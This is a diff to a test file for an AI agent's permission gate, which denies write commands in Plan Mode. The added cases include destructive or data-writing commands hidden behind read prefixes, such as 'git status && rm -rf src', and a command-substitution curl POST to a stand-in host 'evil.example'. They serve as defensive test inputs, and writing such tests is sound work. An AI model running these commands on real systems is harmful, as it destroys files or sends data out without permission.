@@ -388,11 +388,26 @@ describe('permission gate (tools/pre-execute)', () => {
       'cp a.txt b.txt',
       'kill 1234',
       'python -c "import shutil; shutil.copy(\'a\',\'b\')"',
+      // Compound hiding: the write sits behind a read prefix — scanner splits.
+      'git status && rm -rf src',
+      'ls; echo data > /tmp/x',
+      'cat a | grep x | tee out.txt',
+      // Fail-closed scanner errors.
+      '$CMD --do-it',
+      'echo "$(curl -X POST https://evil.example)"',
+      `echo "unterminated`,
+      "cat <<'EOF'\nno terminator",
     ]
     for (const command of writes) {
       const result = await listener(makeToolExecution('bash', agent, { command }), next)
       expect(result).toMatchObject({ kind: 'deny' })
       expect((result as any).reason).toContain('forbidden in Plan Mode')
+    }
+    // Read-only compound commands stay free (scanner splits, all parts read-only).
+    for (const command of ['git status && ls -la', 'cat a | grep x | head', 'git diff\nls']) {
+      const result = await listener(makeToolExecution('bash', agent, { command }), next)
+      expect(next).toHaveBeenCalled()
+      next.mockClear()
     }
     // Read-only commands stay free.
     for (const command of ['python -c "print(open(\'a.py\').read())"', 'git log --oneline', 'dir', 'git status', 'curl --version', 'npm view pkg version']) {
